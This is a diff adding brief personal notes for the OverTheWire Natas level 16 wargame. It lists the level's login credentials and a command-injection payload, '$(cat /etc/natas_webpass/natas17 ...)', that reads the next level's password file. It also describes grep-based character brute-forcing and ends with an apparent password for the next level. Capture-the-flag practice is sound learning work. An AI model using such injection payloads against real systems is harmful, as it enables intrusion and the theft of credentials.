@@ -1,0 +1,11 @@
+URL: http://natas16.natas.labs.overthewire.org
+username: natas16
+password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+(cool method to bypass the scrpting process)
+$(cat /etc/natas_webpass/natas17 > /proc/$$/fd/1)
+'$()' can be used within double quotes to execute that give it's output to us.
+use that to grep each character and it correct nothing will be displayed.
+Script for that put in script16 
+
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
